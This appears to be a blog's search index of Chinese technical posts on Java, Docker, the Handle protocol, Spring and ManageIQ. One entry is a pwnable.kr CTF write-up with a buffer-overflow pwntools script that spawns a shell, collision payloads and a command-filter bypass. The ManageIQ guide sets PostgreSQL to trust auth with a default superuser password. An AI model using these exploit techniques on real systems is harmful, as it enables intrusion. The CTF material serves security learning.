<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[java-move-file-in-docker]]></title>
    <url>%2F2019%2F12%2F10%2Fjava-move-file-in-docker%2F</url>
    <content type="text"><![CDATA[需求将一个文件从根目录下移动到/opt/foo/目录下，并且此文件需要在docker上持久化存储 问题移动文件使用了File#renameTo(File dest),在docker没有挂载数据卷时可以正常移动文件。 但是当docker把/opt/foo/目录挂载为数据卷后，File#renameTo()方法就失效了 原因 Many aspects of the behavior of this method are inherently platform-dependent: The rename operation might not be able to move a file from one filesystem to another, it might not be atomic, and it might not succeed if a file with the destination abstract pathname already exists. The return value should always be checked to make sure that the rename operation was successful. Oracle JDK的官方文档上说明了File#renameTo()在不同的filesystem上可能会失效 解决方法使用Files#move()]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>java docker</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pwnable.kr writeup]]></title>
    <url>%2F2019%2F07%2F14%2Fpwnable-kr-writeup%2F</url>
    <content type="text"><![CDATA[fd题目地址：ssh fd@pwnable.kr -p2222 (pw:guest) 123456789101112131415161718192021#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;char buf[32];int main(int argc, char* argv[], char* envp[])&#123; if(argc&lt;2)&#123; printf("pass argv[1] a number\n"); return 0; &#125; int fd = atoi( argv[1] ) - 0x1234; int len = 0; len = read(fd, buf, 32); if(!strcmp("LETMEWIN\n", buf))&#123; printf("good job :)\n"); system("/bin/cat flag"); exit(0); &#125; printf("learn about Linux file IO\n"); return 0;&#125; File Descriptor 整数型 名称 &lt;unistd.h&gt;符号常量 &lt;stdio.h&gt;文件流 0 Standard input STDIN_FILENO stdin 1 Standard output STDOUT_FILENO stdout 2 Standard error STDERR_FILENO stderr Solution 12$./col 4660 # 0x1234 = 4660LETMEWIN collision题目地址：ssh col@pwnable.kr -p2222 (pw:guest) 12345678910111213141516171819202122232425262728293031#include &lt;stdio.h&gt;#include &lt;string.h&gt;unsigned long hashcode = 0x21DD09EC;unsigned long check_password(const char* p)&#123; int* ip = (int*)p; int i; int res=0; for(i=0; i&lt;5; i++)&#123; res += ip[i]; &#125; return res;&#125;int main(int argc, char* argv[])&#123; if(argc&lt;2)&#123; printf("usage : %s [passcode]\n", argv[0]); return 0; &#125; if(strlen(argv[1]) != 20)&#123; printf("passcode length should be 20 bytes\n"); return 0; &#125; if(hashcode == check_password( argv[1] ))&#123; system("/bin/cat flag"); return 0; &#125; else printf("wrong passcode.\n"); return 0;&#125; Big Endian or Little Endian 12$ python -c "import sys;print(0 if sys.byteorder=='big' else 1)"1 Solution 0x21DD09EC + 1 = 0x21DD09ED 0x21DD09ED / 5 = 0x06C5CEC9 0X21DD09EC = 0x06C5CEC9 * 4 + 0x06C5CEC8 1$./col `python -c 'print "\xc9\xce\xc5\x06"*4 + "\xc8\xce\xc5\x06"'` bof123456789101112131415161718#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;void func(int key)&#123; char overflowme[32]; printf("overflow me : "); gets(overflowme); // smash me! if(key == 0xcafebabe)&#123; system("/bin/sh"); &#125; else&#123; printf("Nah..\n"); &#125;&#125;int main(int argc, char* argv[])&#123; func(0xdeadbeef); return 0;&#125; Solution 通过使用IDA逆向分析，key的位置在ebp+8h，overflow[]的位置在ebp-2ch，两者相差0x34,即需要填充0x34个字节 12345678910# -*- coding: UTF-8 -*-from pwn import *sh = remote("pwnable.kr",9000) # 与服务器交互# 填充junk = 'a'*0x34key = 0xcafebabepayload = junk + p32(key) # p32()对整数进行打包sh.send(payload)sh.interactive() # 直接反弹shell进行交互 random题目地址：ssh random@pwnable.kr -p2222 (pw:guest) 123456789101112131415161718#include &lt;stdio.h&gt;int main()&#123; unsigned int random; random = rand(); // random value! unsigned int key=0; scanf("%d", &amp;key); if( (key ^ random) == 0xdeadbeef )&#123; printf("Good!\n"); system("/bin/cat flag"); return 0; &#125; printf("Wrong, maybe you should try 2^32 cases.\n"); return 0;&#125; rand() &amp; srand() rand()产生一个0到RAND_MAX的伪随机整形值 srand()设置了随机数的种子，默认为1 Solution 因为在一台机器上每次rand()产生的随机数是不变的，所以可以在题目机器上新建c程序，打印rand()值 123456789101112131415$ vim /tmp/random.c----------------------------------------------------#include&lt;stdio.h&gt;void main()&#123; unsigned int random = rand(); printf("%d",random);&#125;----------------------------------------------------$ gcc -o random random.c$ ./random1804289383 key = 1804289383 ^ 0xdeadbeef = ‭3039230856‬ mistake题目地址：ssh mistake@pwnable.kr -p2222 (pw:guest) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950#include &lt;stdio.h&gt;#include &lt;fcntl.h&gt;#define PW_LEN 10#define XORKEY 1void xor(char* s, int len)&#123; int i; for(i=0; i&lt;len; i++)&#123; s[i] ^= XORKEY; &#125;&#125;int main(int argc, char* argv[])&#123; int fd; if(fd=open("/home/mistake/password",O_RDONLY,0400) &lt; 0)&#123; printf("can't open password %d\n", fd); return 0; &#125; printf("do not bruteforce...\n"); sleep(time(0)%20); char pw_buf[PW_LEN+1]; int len; if(!(len=read(fd,pw_buf,PW_LEN) &gt; 0))&#123; printf("read error\n"); close(fd); return 0; &#125; char pw_buf2[PW_LEN+1]; printf("input password : "); scanf("%10s", pw_buf2); // xor your input xor(pw_buf2, 10); if(!strncmp(pw_buf, pw_buf2, PW_LEN))&#123; printf("Password OK\n"); system("/bin/cat flag\n"); &#125; else&#123; printf("Wrong Password\n"); &#125; close(fd); return 0;&#125; Solution 需要pw_buf === pw_buf2 .^ 1 0对应ascii码为48(0011 0000) 1对应ascii码为49(0011 0001) 0001 ^ 1 = 0000 所以pw_buf = 0000000000,pw_buf2 = 1111111111 blackjackSolution 游戏是21点，需要获得一百万金钱。阅读源码发现bet变量为int型，程序内也没做检查，所以输入bet为负数，令自己输，那么就可以一次获得百万。 lotto123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;unsigned char submit[6];void play()&#123; int i; printf("Submit your 6 lotto bytes : "); fflush(stdout); int r; r = read(0, submit, 6); printf("Lotto Start!\n"); //sleep(1); // generate lotto numbers int fd = open("/dev/urandom", O_RDONLY); if(fd==-1)&#123; printf("error. tell admin\n"); exit(-1); &#125; unsigned char lotto[6]; if(read(fd, lotto, 6) != 6)&#123; printf("error2. tell admin\n"); exit(-1); &#125; for(i=0; i&lt;6; i++)&#123; lotto[i] = (lotto[i] % 45) + 1; // 1 ~ 45 &#125; close(fd); // calculate lotto score int match = 0, j = 0; for(i=0; i&lt;6; i++)&#123; for(j=0; j&lt;6; j++)&#123; if(lotto[i] == submit[j])&#123; match++; &#125; &#125; &#125; // win! if(match == 6)&#123; system("/bin/cat flag"); &#125; else&#123; printf("bad luck...\n"); &#125;&#125; Solution 程序从/dev/urandom文件中取出6字节并mod45，使6字节的ascii都在1-45 获取flag需要使输入的6字节和lotto中仅有一个相同，所以输入任意ascii在1-45中的一个，多次尝试，有几率使match==6 例如输入：—— cmd112345678910111213141516#include &lt;stdio.h&gt;#include &lt;string.h&gt;int filter(char* cmd)&#123; int r=0; r += strstr(cmd, "flag")!=0; r += strstr(cmd, "sh")!=0; r += strstr(cmd, "tmp")!=0; return r;&#125;int main(int argc, char* argv[], char** envp)&#123; putenv("PATH=/thankyouverymuch"); if(filter(argv[1])) return 0; system( argv[1] ); return 0;&#125; Solution 程序对输入的参数进行了检查，如果含有sh、flag、tmp就不执行system() 可以利用system会处理转义进行绕过 1$ cmd1 "/bin/cat \f\l\a\g"]]></content>
      <categories>
        <category>PWN</category>
      </categories>
      <tags>
        <tag>pwn</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Handle协议分析]]></title>
    <url>%2F2019%2F05%2F06%2Fhandle-system-overview%2F</url>
    <content type="text"><![CDATA[物联网的概念互联网中，我们可以使用手机、平板电脑、笔记本电脑或者台式机去访问互联网提供的各种服务。 随着互联网的不断发展，接入互联网的设备不在局限与手机、电脑之类的终端。增加了一些新的设备，例如：智能家电、汽车(导航系统)等。随之而来的，便是物联网概念的提出。 物联网是物物互联的互联网。 其一，物联网的核心和基础仍然是互联网，是在互联网基础上的延伸和扩展的网络。 其二，其用户端延伸和扩展到了任何物品与物品之间，进行信息交换和通信，也就是物物相息。 物联网标识智能家电、汽车等设备接入互联网，实质上是嵌入式系统接入了互联网，与传统互联网的依旧兼容。但是我们希望更多的物品都能接入网络，不仅是手机、电脑、嵌入式系统，还可以是一批货物、一本书籍、一部电影、一首音乐，甚至是一项技术、一个数据集，成为真正的物物互联。 所以，物联网需要对联网的物品进行统一标识。需要标识的联网对象包括物理实体和虚拟对象。 在互联网中，有MAC地址、ip地址、域名来对终端进行标识。 在物联网中，使用数字对象标识符(Digital Object Identifier DOI ) 对联网对象进行标识。 标识的解析域名通过dns解析为IP地址。 DOI通过Handle解析为IP地址或标识对象的信息。 Handle系统定义​ Handle系统是一个用来提供一种高效、可扩展、安全的全球名字解析服务的分布式信息系统。 特点 唯一性 Uniqueness 每一个handle在系统中是全球唯一的 持久性 Persistence 一个handle并不依赖于实体自身，handle系统是建立了handle与实体间的联系、对应关系 多实例 Multiple Instances 一个handle可以指向一个资源对应的多个实体 一个网络服务可以用一个handle定义多个服务入口，以达到负载均衡 多属性 Multiple Attributes DNS ： 域名 ——–&gt; IP Handle : DOI ——–&gt; IP、URL、Email、权限、其他自定义属性 可扩展 Extensible Namespace 本地的handle系统节点可以加入全球handle系统节点 全球化支持 International Support handle系统使用Unicode3.0 支持多语言的字符集 分布式 Distributed Service Model 安全的名字解析服务 Secured Name Service 可以确保数据的完整性、机密性 分布式的管理服务 Distributed Administration Service 每个handle节点都可以定义自己的管理员 形式 HandleNamingAuthority为DOI号的前缀，HandleLocalName为后缀。 所有的 DOI 号前缀以 10 开头，并且按顺序分配，无需要保留的前缀。后缀是由该 DOI 号的所有人或机构分配的本地字符，代表其所有人或机构。 例如：10.1045/may99-payette 是一篇发表在D-Lib杂志上的文章的handle标识。 12345678910111213141516171819202122232425262728293031323334353637383940&#123; "responseCode" : 1 , "handle" : "10.1045/may99-payette" , "values" :[ &#123; "index" : 100 , "type" : "HS_ADMIN" , "data" :&#123; "format" : "admin" , "value" :&#123; "handle" : "0.NA/10.1045" , "index" : 200 , "permissions" : "011111111111" &#125; &#125;, "ttl" : 86400 , "timestamp" : "2000-04-14T07:25:21Z" &#125;, &#123; "index" : 4 , "type" : "URL" , "data" :&#123; "format" : "string" , "value" : "http://www.dlib.org/dlib/may99/payette/05payette.html" &#125;, "ttl" : 86400 , "timestamp" : "2003-02-07T18:49:14Z" &#125;, &#123; "index" : 8 , "type" : "700050" , "data" :&#123; "format" : "string" , "value" : "200302031035" &#125;, "ttl" : 86400 , "timestamp" : "2003-02-07T18:49:15Z" &#125; ]&#125; index 每个handle value的编号 type type标识handle value的类型，需要注册，防止重复 permissions handle管理员的权限 TTL 可以被缓存的时间 timestamp 最后修改信息的时间 分布式handle系统是分布式的 handle节点分为Global Handle Registry(GHR)和 Local Handle Services (LHSs) 所以查询时，需要先找到DOI前缀对应的LHS，再查询其后缀对应的信息。 DNS &amp; DNS SECDNS的缺点 DNS 协议缺乏必要的认证机制，客户无法确认接收到的信息的真实性和权威性，而且会遭到“ 中间人 ”攻击，其正确性也无法判断。 DNS SECDNS SEC全称Domain Name System Security Extensions，即DNS安全扩展，是由IETF提供的一系列DNS安全认证的机制。它提供一种可以验证应答信息真实性和完整性的机制，利用密码技术，使得域名解析服务器可以验证它所收到的应答(包括域名不存在的应答)是否来自于真实的服务器，或者是否在传输过程中被篡改过。 通过DNSSEC的部署，可以增强对DNS域名服务器的身份认证，进而帮助防止DNS缓存污染等攻击。 DNSSEC通过公钥密码技术对DNS中的信息创建密码签名，为DNS信息同时提供认证和信息完整性检查，它的实施步骤如下： DNS服务器收到DNS查询请求后，用散列函数将要回复DNS报文的内容进行散列运算，得到“内容摘要”，使用私匙加密后再附加到DNS报文中； DNS查询请求者接收到报文后，利用公匙解密收到的“内容摘要”，再利用散列函数计算一次DNS查询请求报文中的“内容摘要”，两者对比； 若相同，就可以确认接收到的DNS信息是正确的DNS响应；若验证失败，则表明这一报文可能是假冒的，或者在传输过程、缓存过程中被篡改了。 为此，DNS SEC添加了一些内容来实现对DNS的安全性改进。 RRSIG(Resource Record Signature)记录：存储资源记录集合(RRSets)的数字签名 DNSKEY(DNS Public Key)记录：存储公开密钥 DS(Delegation Signer)记录：存储DNSKEY的散列值，用于验证DNSKEY的真实性，从而建立一个信任链 NSEC(Next Secure)记录：用于应答那些不存在的资源记录 使用linux系统中的dig命令可以看到查询DNS的过程,可以看到29-30行，其中包含了DS记录和RRSIG记录，说明DNS服务器支持DNS SEC。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051~$ dig @223.5.5.5 xidian.edu.cn +trace; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.7-Ubuntu &lt;&lt;&gt;&gt; @223.5.5.5 xidian.edu.cn +trace; (1 server found);; global options: +cmd. 241418 IN NS m.root-servers.net.. 241418 IN NS j.root-servers.net.. 241418 IN NS i.root-servers.net.. 241418 IN NS a.root-servers.net.. 241418 IN NS k.root-servers.net.. 241418 IN NS g.root-servers.net.. 241418 IN NS c.root-servers.net.. 241418 IN NS b.root-servers.net.. 241418 IN NS e.root-servers.net.. 241418 IN NS f.root-servers.net.. 241418 IN NS h.root-servers.net.. 241418 IN NS d.root-servers.net.. 241418 IN NS l.root-servers.net.;; Received 228 bytes from 223.5.5.5#53(223.5.5.5) in 56 mscn. 172800 IN NS a.dns.cn.cn. 172800 IN NS b.dns.cn.cn. 172800 IN NS c.dns.cn.cn. 172800 IN NS d.dns.cn.cn. 172800 IN NS e.dns.cn.cn. 172800 IN NS f.dns.cn.cn. 172800 IN NS g.dns.cn.cn. 172800 IN NS ns.cernet.net.cn. 86400 IN DS 57724 8 2 5D0423633EB24A499BE78AA22D1C0C9BA36218FF49FD95A4CDF1A4AD 97C67044cn. 86400 IN RRSIG DS 8 1 86400 20190519050000 20190506040000 25266 . eCDU1Z+rBMKnkbKR/TpKEqAYcY0EEtyMHHeladAciGmKeb3IAzHQF5QV PFDco/hmTswItIMEI6FmuAO51Sy/AQnuVBU+jpzr8Kc/sDUCDLzbxL7n M0aTy152Xp3eJBXszpYAMTnv7U8W+RUvpyzZhdDfeJ+r8mGrR1EPWZHJ MwzEbjnKD3nA3nVnoz0QzJ2x/oilNvU/Wka8CebcpIiKyzkUooi2gGcb 38QLQS5kBmnHJuo+k1e6eFPFw5GSsErrOUBeqzGpP4BmxWuLWEBjV7HI 5oACSJf0d1gfa7gEoPm6oHQ+SUewOe42O0hp34YxwXEXZWv3kkfHDYmT x1EYRA==;; Received 704 bytes from 192.5.5.241#53(f.root-servers.net) in 4 msedu.cn. 172800 IN NS deneb.dfn.de.edu.cn. 172800 IN NS ns2.cernet.net.edu.cn. 172800 IN NS ns2.cuhk.hk.edu.cn. 172800 IN NS dns.edu.cn.edu.cn. 172800 IN NS dns2.edu.cn.3QDAQA092EE5BELP64A74EBNB8J53D7E.cn. 21600 IN NSEC3 1 1 10 AEF123AB 3QLMP0QRNQ96G5AFGOPNB7U7IJ4MBP4B NS SOA RRSIG DNSKEY NSEC3PARAM3QDAQA092EE5BELP64A74EBNB8J53D7E.cn. 21600 IN RRSIG NSEC3 8 2 21600 20190515195452 20190415192259 31725 cn. q7KTq++lryMndugKWjnCrtbKvx3984P8Uo1e8of8iCNP5v8FLjTe+afE 75ZFfDmkH6XVw9clBETGpWZUuewgSIpVEmZXyIC3j9zf0RSFvq8hJcmC vjgWume2UnUme85LhSFm+rLtl1Waf3lgBHHf+BxnWsoqtpcolJp286QN bI0=39RHJMG7OQR8QCTU59OBQ62NRDQE045I.cn. 21600 IN NSEC3 1 1 10 AEF123AB 3A62EEG57NMMFHK1O7347GBEBUJUESOH CNAME RRSIG39RHJMG7OQR8QCTU59OBQ62NRDQE045I.cn. 21600 IN RRSIG NSEC3 8 2 21600 20190603183139 20190504180539 31725 cn. mej1hXtnBzBTj6ywqsbnNh+LX2XbFLJ5rp2KhdTyzlINKRpYCqdgAzgD 9z8gCk/Bw+6S8d6dg/E1L4n8wmJRk83J+5YLsZMHioN5b12PGOZyszpz LoMmqCT+okNllxSk0xMNQfE+K6Bumw/jEM/RbTq/UX+8UMyVuHRGiEy0 voM=;; Received 681 bytes from 203.119.28.1#53(d.dns.cn) in 14 msxidian.edu.cn. 172800 IN NS ns2.xidian.edu.cn.xidian.edu.cn. 172800 IN NS ns1.xidian.edu.cn.ET1HHHLVN75UC5DM4LOBLMCMCAT3ENGN.edu.cn. 21600 IN NSEC3 1 0 10 AFFF ETAHAEFRR4256IDB6UFN97I4N2LUONED NSET1HHHLVN75UC5DM4LOBLMCMCAT3ENGN.edu.cn. 21600 IN RRSIG NSEC3 8 3 21600 20190527134345 20190427133441 21204 edu.cn. AvP6N5obx+m6gFwio1Q2kdN2e4Y4NG5WSwvpVwg8gerkAMhaVZLlmYdG 7aIDQl0n1xsV0IcMEbSPvqbA56d9L2LllYJvA+UNYb1nQmxHq7EOrWBN 6Z2pF3HqcORm2uwOThuevCvftoy5ocXvJJlJYGKX8ggrCDSF/z40G5CV GW0=;; Received 352 bytes from 192.76.176.9#53(deneb.dfn.de) in 273 msxidian.edu.cn. 3600 IN SOA ns1.xidian.edu.cn. root.xidian.edu.cn. 2019042901 30 150 115200 3600;; Received 87 bytes from 61.150.43.66#53(ns2.xidian.edu.cn) in 164 ms ​ DNS SEC虽然保证了DNS信息的真实性和完整性，但并没有实现机密性，即DNS 会对不管任何人提出的请求作出同样的响应。因此所有的DNS数据都是可见的。所以DNSSEC不能支持机密性、访问权限控制或者其他区分访问者身份的服务。 Handle的安全保证​ 默认的情况下, Handle 客户端解析时不需要任何身份认证。然而请求隐私数据, 以及进行远程管理操作时都需要对客 户端进行相应的认证。服务器将会决定客户端是否有足够的 权限来访问这些隐私数据或进行一些远程管理的操作。 进行身份认证时, Handle 服务器会发起一个 Challenge 请求给需要验证的客户端。为了完成认证的过程, 客户端需要返 回一个正确的Response消息给服务器, 以说明自己是正确的管理员。Handle 服务器只有在收到正确的 Response之后才会完成客户端先前提出的请求。 Handle 客户端可以选择公/私钥的方式来进行认证。Handle系统的认证过程也可以通过第三方认证服 务来执行。为了保证数据的完整性, 客户端需要服务器对返回 的响应做签名。 客户端也可以与服务器建立一个安全的对话期( Session) , 这样同一个对话期内的通信过程将被加密。 步骤1：客户端发起请求 步骤2：服务端收到客户端请求，返回会话ID和挑战信息（随机字符串） 步骤3：客户端响应挑战，返回会话ID、挑战的响应、管理员索引(Handle系统可以有多个管理员，告诉服务端自己是哪个管理员) 步骤4：服务端收到客户端以私钥的方式进行验证的请求，将挑战的响应发给可信的key-server来认证 步骤5：key-server返回认证结果 步骤6：服务器告诉客户端确认完成认证 在步骤3中，客户端可以选择公钥或私钥验证的方式。 当认证方式为公钥时，即AuthenticationType为HS_PUBKEY，挑战的响应为Sig(H(ServerChallenge))。服务端收到后，根据管理员的公钥对其验证，通过后执行步骤6。 若认证方式为私钥时，即AuthenticationType为HS_SECKEY，挑战的响应为MD5_Hash(&lt;SecretKey&gt; + &lt;ServerChallenge&gt; + &lt;SecretKey&gt;)或 SHA-1_Hash(&lt;SecretKey&gt; + &lt;ServerChallenge&gt; + &lt;SecretKey&gt;) 或者使用HMAC。此时，服务端无法验证，需要执行步骤4。 通过验证的客户端便可以进行权限范围内的操作。所以完整的Handle请求流程如下图。 参考文档[RFC 3650] Handle System Overview [RFC 3651] Handle System Namespace and Service Definition [RFC 3652] Handle System Protocol (ver 2.1) Specification]]></content>
      <categories>
        <category>IoT</category>
      </categories>
      <tags>
        <tag>handle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[springboot在filter中使用@Value注解]]></title>
    <url>%2F2019%2F03%2F30%2Fspringboot-use-%40Value-in-filter%2F</url>
    <content type="text"><![CDATA[由于filter中需要对请求进行重定向，且开发测试环境的重定向url不同，因此需要使用@Value来获取不同环境中的重定向地址。 但是发现@Value获取的值为null,最后找到了原因，是因为filter不是spring bean，@Value无法生效。 解决方法： 将filter通过依赖注入FilterRegistrationBean 使用DelegatingFilterProxy 123456789101112131415161718192021222324252627282930# 方法一@Configurationpublic class FilterConfig &#123; @Bean public FilterRegistrationBean registerFilter(BasicFilter filter) &#123; FilterRegistrationBean registration = new FilterRegistrationBean(); registration.setFilter(filter); registration.addUrlPatterns("/secure/*"); return registration; &#125;&#125;# 方法二@Configurationpublic class FilterConfig &#123; @Bean public Filter BasicFilter()&#123; return new BasicFilter(); &#125; @Bean public FilterRegistrationBean registerFilter() &#123; FilterRegistrationBean registration = new FilterRegistrationBean(); registration.setFilter(new DelegatingFilterProxy("BasicFilter")); registration.addUrlPatterns("/secure/*"); return registration; &#125;&#125;]]></content>
      <categories>
        <category>Spring</category>
      </categories>
      <tags>
        <tag>spring</tag>
        <tag>filter</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ManageIQ Provider开发（五）：Provider-google的代码结构]]></title>
    <url>%2F2019%2F03%2F02%2Fmanageiq-providers-google-layout%2F</url>
    <content type="text"><![CDATA[在《ManageIQ的工程结构》中，已经明确了providers的作用。接下来以provider-google为例，分析其代码结构。 provider的主要功能代码集中在app文件夹下中，根据功能划分为多个manager，分别为cloud_manager、network_manager, provider-amazon还有storage_manager。 Cloud_managercloud_manager是provider的主入口，负责创建、验证服务器，收集服务器基本信息，如可用区域、可用套餐、已拥有的虚拟主机等。 cloud_manager的代码结构： cloud_manager.rb为主入口，定义了ems(ExtmanagementSystem)的类型、描述、验证方式等 manager_mixin.rb的主要功能为实现与服务器的验证连接 cloud_manager文件夹 有cloud_manager涉及的类，如可用区域、可用套餐等。这些类都比较简单，仅继承managerIQ中的对应类 refresh的功能为数据转换，即把fog-google获得数据变为符合manageiq的数据 ​ 123456789101112131415161718192021222324252627282930313233343536373839# refresh_parser.rb# 定义了进行数据转换的方法def ems_inv_to_hashes log_header = "Collecting data for EMS : [#&#123;@ems.name&#125;] id: [#&#123;@ems.id&#125;]" _log.info("#&#123;log_header&#125;...") get_zones get_flavors get_volumes get_snapshots get_images get_instances # Must occur after get_volumes is called _log.info("#&#123;log_header&#125;...Complete") link_volumes_to_base_snapshots @dataenddef get_zones # 获取所有可用域 zones = @connection.zones.all # 数据进行转换 process_collection(zones, :availability_zones) &#123; |zone| parse_zone(zone) &#125;enddef parse_zone(zone) name = uid = zone.name type = ManageIQ::Providers::Google::CloudManager::AvailabilityZone.name new_result = &#123; :type =&gt; type, :ems_ref =&gt; uid, :name =&gt; name, &#125; return uid, new_resultend Network_managernetwork_manager的结构与cloud_manager类似 参考文档ManageIQ-Providers-google]]></content>
      <categories>
        <category>ManageIQ</category>
      </categories>
      <tags>
        <tag>manageiq</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ManageIQ Provider开发（四）：ManageIQ的工程结构]]></title>
    <url>%2F2019%2F02%2F26%2Fmanageiq-project-layout%2F</url>
    <content type="text"><![CDATA[本文主要分析ManageIQ的工程结构，明确Provider的作用（将云服务商API获取的数据转变为符合ManageIQ需求的数据）。 ManageIQ的工程结构ManageIQ的工程结构示意图如下 Provider的作用就是为了适配不同的云服务商所提供的数据，将其转变为符合ManageIQ的数据。 Provider为了获取云服务商提供的数据，需要请求其各自的API。为了更好的解耦代码，Provider不直接与API进行交互，而是通过官方提供或开源的SDK进行交互。 这些SDK不仅解耦了代码，还对API数据进行了初步的封装，将json转变为了类，方便了Provider进行调用。 AMAZON-SDK为亚马逊官方提供的，功能比较齐全，代码量比较大，参照其开发自己需要的SDK比较费时费力；FOG-GOOGLE是开源的云服务器API交互SDK，基于FOG二次开发比较简单，快捷。 参考文档ManageIQ-Providers-amazon ManageIQ-Providers-google fog-google amazon-sdk(v2)]]></content>
      <categories>
        <category>ManageIQ</category>
      </categories>
      <tags>
        <tag>manageiq</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ManageIQ Provider开发（三）：使用自定义前端页面]]></title>
    <url>%2F2019%2F01%2F11%2Fmanageiq-local-ui%2F</url>
    <content type="text"><![CDATA[在ManageIQ安装过程中，会从github上拉取manageiq-ui-classic库。现在我们开发新的Provider就需要修改manageiq-ui-classic库，使其支持新的Provider。 克隆源码12cd manangeiq/pluginsgit clone -b gaprindashvili-7 https://github.com/ManageIQ/manageiq-ui-classic.git 修改配置文件1234cd manageiq/bundler.dvim local_plugins.rboverride_gem 'manageiq-ui-classic', :path =&gt; File.expand_path('../plugins/manageiq-ui-classic', __dir__) 修改源代码manageiq/app/assets/javascripts/controllers/ems_common/ems_common_form_controller.js 中为各provider验证方式的前端显示，根据需要增加自己的验证方式 assesskey方式可参考代码中amazon的相关代码，搜索ec2即可定位相关代码 安装本地ui12cd manageiqbundle install]]></content>
      <categories>
        <category>ManageIQ</category>
      </categories>
      <tags>
        <tag>manageiq</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ManageIQ Provider开发（二）：创建新的Provider]]></title>
    <url>%2F2019%2F01%2F07%2Fmanageiq-provider-generator%2F</url>
    <content type="text"><![CDATA[创建Provider123cd manageiqbundle exec rails generate provider foo_cloud --dummy 修改配置文件Provider生成器会在manageiq/Gemfile文件中添加foo_cloud,但还需要进一步修改 123456# generator自动生成group :vmware, :manageiq_default do manageiq_plugin "manageiq-providers-vmware"manageiq_plugin "manageiq-providers-foo_cloud" # TODO: Sort alphabetically... gem "vmware_web_service", "~&gt;0.3.0"end 123456789# 修改后的Gemfilegroup :foo_cloud, :manageiq_default do gem 'manageiq-providers-foo_cloud', :path =&gt; 'plugins/manageiq-providers-foo_cloud'endgroup :vmware, :manageiq_default do manageiq_plugin "manageiq-providers-vmware" gem "vmware_web_service", "~&gt;0.3.0"end 修改lib/workers/miq_worker_types.rb文件 在MIQ_WORKER_TYPES中添加 1234"ManageIQ::Providers::FooCloud::CloudManager::EventCatcher" =&gt; %i(manageiq_default),"ManageIQ::Providers::FooCloud::CloudManager::MetricsCollectorWorker" =&gt; %i(manageiq_default),"ManageIQ::Providers::FooCloud::CloudManager::RefreshWorker" =&gt; %i(manageiq_default),"ManageIQ::Providers::FooCloud::NetworkManager::RefreshWorker" =&gt; %i(manageiq_default), 在MIQ_WORKER_TYPES_IN_KILL_ORDER中添加 1234ManageIQ::Providers::FooCloud::CloudManager::MetricsCollectorWorkerManageIQ::Providers::FooCloud::CloudManager::RefreshWorkerManageIQ::Providers::FooCloud::NetworkManager::RefreshWorkerManageIQ::Providers::FooCloud::CloudManager::EventCatcher 安装新的Provider12cd manageiqbundle install 参考文档ManageIQ Provider生成器]]></content>
      <categories>
        <category>ManageIQ</category>
      </categories>
      <tags>
        <tag>manageiq</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ManageIQ Provider开发（一）：ManageIQ的安装]]></title>
    <url>%2F2019%2F01%2F04%2Fmanageiq-install%2F</url>
    <content type="text"><![CDATA[系统环境Ubuntu 16.04 64位 依赖包安装及配置12345678910111213141516171819202122232425262728# Git and componentssudo apt install git# Memcached for the session storesudo apt install memcached # PostgreSQL Database server and to build 'pg' Gemsudo apt install postgresql libpq-dev# For Nokogiri Gemsudo apt install libxml2-dev libxslt-dev patch # For sqlite3 Gemsudo apt install libsqlite-dev libsqlite3-dev # For unf Gemsudo apt install g++ # For Curbsudo apt install libcurl4-gnutls-dev # For rugged Gemsudo apt install cmakesudo apt install libgit2-dev pkg-config libtool# For puma &lt; 3.7.0sudo apt install libssl-dev 123456789101112131415161718192021222324252627282930313233# Install Node.js(version &gt;= 8.9.0)wget https://nodejs.org/dist/v10.15.0/node-v10.15.0.tar.gztar -xzvf node-v10.15.0.tar.gzcd ./node-v10.15.0./configuresudo make &amp;&amp; make install# Enable Memcachedsudo systemctl enable memcachedsudo systemctl start memcached# Configure PostgreSQLsudo grep -q '^local\s' /etc/postgresql/9.5/main/pg_hba.conf || echo "local all all trust" | sudo tee -a /etc/postgresql/9.5/main/pg_hba.confsudo sed -i.bak 's/\(^local\s*\w*\s*\w*\s*\)\(peer$\)/\1trust/' /etc/postgresql/9.5/main/pg_hba.confsudo systemctl restart postgresqlsudo su postgres -c "psql -c \"CREATE ROLE root SUPERUSER LOGIN PASSWORD 'smartvm'\""# Install Ruby(version &gt;= 2.3.1)wget https://cache.ruby-lang.org/pub/ruby/2.4/ruby-2.4.5.tar.gztar -xzvf ruby-2.4.5.tar.gzcd ./ruby-2.4.5./configuresudo make &amp;&amp; make install# Install the Bower package managersudo npm install -g bower# Install the Yarn package managersudo npm install -g yarn# Install the Gulp and Webpack build systemsudo npm install -g gulp-clisudo npm install -g webpack ManageIQ安装当前版本 Gaprindashvili-7 ManageIQ在Github上master分支不是稳定版本 123456# Clone the Codegit clone -b gaprindashvili-7 https://github.com/ManageIQ/manageiq.git# Install ManageIQcd ./manageiqbin/setup ManageIQ的依赖安装，配置，数据库初始化都将执行，所以安装过程较长。国内网络原因可能会造成安装失败，建议挂梯子执行安装，或修改npm、yarn的源。 启动ManageIQ1bundle exec rake evm:start 访问localhost:3000 参考文档ManageIQ安装官方文档]]></content>
      <categories>
        <category>ManageIQ</category>
      </categories>
      <tags>
        <tag>manageiq</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Tuleap的postfix邮件设置]]></title>
    <url>%2F2018%2F11%2F22%2Ftuleap-postfix-config%2F</url>
